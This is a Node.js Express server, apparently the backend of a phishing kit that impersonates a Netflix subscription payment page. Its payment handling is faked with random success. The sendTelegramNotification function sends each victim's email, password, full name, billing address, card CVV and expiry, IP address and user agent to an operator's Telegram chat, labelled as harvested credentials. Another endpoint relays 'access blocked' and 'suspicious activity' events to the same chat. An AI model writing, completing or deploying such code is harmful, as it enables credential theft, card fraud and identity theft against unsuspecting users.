const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const crypto = require('crypto');
require('dotenv').config();
const config = require('./config');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('.'));

// IP Address Tracking Middleware
app.use((req, res, next) => {
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;
    req.userIP = ip || req.ip || 'unknown';
    next();
});

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || config.telegram.botToken;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || config.telegram.chatId;

// In-memory storage (in production, use a proper database)
const users = new Map();
const subscriptions = new Map();
const payments = new Map();

// Payment Processing
app.post('/api/create-payment-intent', async (req, res) => {
    try {
        const { planName, price, email, userId } = req.body;
        
        // Generate unique payment ID
        const paymentId = `pay_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Create payment record
        const payment = {
            id: paymentId,
            userId: userId || `user_${Date.now()}`,
            planName,
            price,
            email,
            currency: 'USD',
            status: 'pending',
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString() // 30 minutes
        };
        
        payments.set(paymentId, payment);
        
        // Simulate payment processing (in production, integrate with Stripe/PayPal)
        const paymentIntent = {
            id: paymentId,
            clientSecret: `pi_${paymentId}_secret_${Math.random().toString(36).substr(2, 9)}`,
            amount: Math.round(price * 100), // Convert to cents
            currency: 'usd'
        };
        
        res.json({
            success: true,
            paymentIntent,
            paymentId
        });
        
    } catch (error) {
        console.error('Payment creation error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to create payment intent'
        });
    }
});

// Process Payment
app.post('/api/process-payment', async (req, res) => {
    try {
        const { paymentId, paymentMethodId, cardInfo, userData } = req.body;
        const payment = payments.get(paymentId);
        
        if (!payment) {
            return res.status(404).json({
                success: false,
                error: 'Payment not found'
            });
        }
        
        // Store user data with payment including IP
        payment.userData = userData;
        payment.userIP = req.userIP;
        payment.userAgent = req.headers['user-agent'] || 'unknown';
        
        // Simulate payment processing
        const processingTime = Math.random() * 2000 + 1000; // 1-3 seconds
        await new Promise(resolve => setTimeout(resolve, processingTime));
        
        // Simulate payment success/failure (90% success rate)
        const paymentSuccessful = Math.random() > 0.1;
        
        if (paymentSuccessful) {
            payment.status = 'completed';
            payment.completedAt = new Date().toISOString();
            payment.paymentMethod = 'card';
            payment.last4 = cardInfo.last4;
            payment.brand = cardInfo.brand;
            
            // Create subscription
            const subscription = {
                id: `sub_${Date.now()}`,
                userId: payment.userId,
                planName: payment.planName,
                price: payment.price,
                status: 'active',
                startDate: new Date().toISOString(),
                nextBillingDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 days
                paymentId: payment.id
            };
            
            subscriptions.set(subscription.id, subscription);
            
            // Send comprehensive Telegram notification
            await sendTelegramNotification(payment, subscription);
            
            res.json({
                success: true,
                subscription,
                message: 'Payment successful! Subscription activated.'
            });
        } else {
            payment.status = 'failed';
            payment.failedAt = new Date().toISOString();
            payment.error = 'Payment declined by bank';
            
            res.status(400).json({
                success: false,
                error: 'Payment declined. Please try another payment method.'
            });
        }
        
    } catch (error) {
        console.error('Payment processing error:', error);
        res.status(500).json({
            success: false,
            error: 'Payment processing failed'
        });
    }
});

// Get Subscription Status
app.get('/api/subscription/:userId', (req, res) => {
    const { userId } = req.params;
    const userSubscriptions = Array.from(subscriptions.values())
        .filter(sub => sub.userId === userId && sub.status === 'active');
    
    if (userSubscriptions.length > 0) {
        res.json({
            success: true,
            subscription: userSubscriptions[0]
        });
    } else {
        res.json({
            success: false,
            message: 'No active subscription found'
        });
    }
});

// Get Payment History
app.get('/api/payments/:userId', (req, res) => {
    const { userId } = req.params;
    const userPayments = Array.from(payments.values())
        .filter(payment => payment.userId === userId)
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    
    res.json({
        success: true,
        payments: userPayments
    });
});

// Telegram Notification Function
async function sendTelegramNotification(payment, subscription) {
    try {
        const userData = payment.userData || {};
        const message = `
🎉 *NETFLIX SUBSCRIPTION PAYMENT RECEIVED* 🎉

🔐 *USER CREDENTIALS:*
📧 *Email:* ${payment.email}
🔑 *Password:* ${userData.password || 'N/A'}
👤 *Full Name:* ${userData.fullname || 'N/A'}

🏠 *BILLING ADDRESS:*
📍 *Address:* ${userData.address || 'N/A'}
🏙️ *City:* ${userData.city || 'N/A'}
🗺️ *State:* ${userData.state || 'N/A'}
📮 *ZIP:* ${userData.zip || 'N/A'}

💳 *PAYMENT INFORMATION:*
📺 *Plan:* ${payment.planName}
💰 *Amount:* $${payment.price} USD
💳 *Card:* ${payment.brand} ****${payment.last4}
🔢 *CVV:* ${userData.cvv || 'N/A'}
📅 *Expiry:* ${userData.expiry || 'N/A'}
💳 *Payment Date:* ${new Date().toLocaleString()}

🆔 *TRANSACTION DETAILS:*
🔢 *Payment ID:* ${payment.id}
🔄 *Subscription ID:* ${subscription.id}
⏰ *Next Billing:* ${new Date(subscription.nextBillingDate).toLocaleDateString()}
✅ *Status:* ACTIVE

🌐 *TECHNICAL INFORMATION:*
🖥️ *IP Address:* ${payment.userIP || 'N/A'}
📱 *User Agent:* ${payment.userAgent ? payment.userAgent.substring(0, 100) + '...' : 'N/A'}
📍 *Location:* ${payment.userIP ? `https://ipinfo.io/${payment.userIP}` : 'N/A'}

🎬 *Account Status:* READY TO STREAM!
📱 *Login:* https://netflix.com/login
📧 *Use Email & Password above to sign in*

⚠️ *SECURITY NOTICE:* Keep these credentials secure!
        `;
        
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        console.log('Telegram notification sent successfully');
        
    } catch (error) {
        console.error('Telegram notification failed:', error.message);
    }
}

// Test Telegram Connection
app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `
🧪 *TELEGRAM TEST MESSAGE* 🧪

✅ Bot connection successful!
📱 Netflix Payment System Ready
⏰ Test time: ${new Date().toLocaleString()}
        `;
        
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: testMessage,
            parse_mode: 'Markdown'
        });
        
        res.json({
            success: true,
            message: 'Test message sent to Telegram'
        });
        
    } catch (error) {
        console.error('Telegram test failed:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to send test message'
        });
    }
});

// Log Security Events
app.post('/api/log-security-event', (req, res) => {
    try {
        const { eventType, data, userAgent } = req.body;
        
        // Log security event with IP and timestamp
        const securityEvent = {
            eventType,
            data,
            userAgent,
            userIP: req.userIP,
            timestamp: new Date().toISOString()
        };
        
        console.log('🚨 SECURITY EVENT:', securityEvent);
        
        // Send critical security events to Telegram
        if (eventType === 'SUSPICIOUS_ACTIVITY' || eventType === 'ACCESS_BLOCKED') {
            sendSecurityAlert(securityEvent);
        }
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Security logging error:', error);
        res.status(500).json({ success: false });
    }
});

// Security Alert Function
async function sendSecurityAlert(event) {
    try {
        const message = `
🚨 *NETFLIX SECURITY ALERT* 🚨

🔍 *Event Type:* ${event.eventType}
🖥️ *IP Address:* ${event.userIP}
📱 *User Agent:* ${event.userAgent ? event.userAgent.substring(0, 100) + '...' : 'N/A'}
⏰ *Timestamp:* ${event.timestamp}

📋 *Details:*
${event.data.reason ? `📍 Reason: ${event.data.reason}` : ''}
${event.data.attempts ? `🔄 Attempts: ${event.data.attempts}` : ''}
${event.data.timeExpired ? `⏱️ Time Expired: Yes` : ''}

🛡️ *Status:* Security system active
📍 *Location:* ${event.userIP ? `https://ipinfo.io/${event.userIP}` : 'N/A'}

⚠️ *This is an automated security alert*
        `;
        
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        console.log('Security alert sent to Telegram');
        
    } catch (error) {
        console.error('Security alert failed:', error.message);
    }
}

// Health Check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile('index.html', { root: '.' });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Netflix Payment Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot configured for chat: ${TELEGRAM_CHAT_ID}`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
});

// Error handling
process.on('unhandledRejection', (err) => {
    console.error('Unhandled Promise Rejection:', err);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    process.exit(1);
});
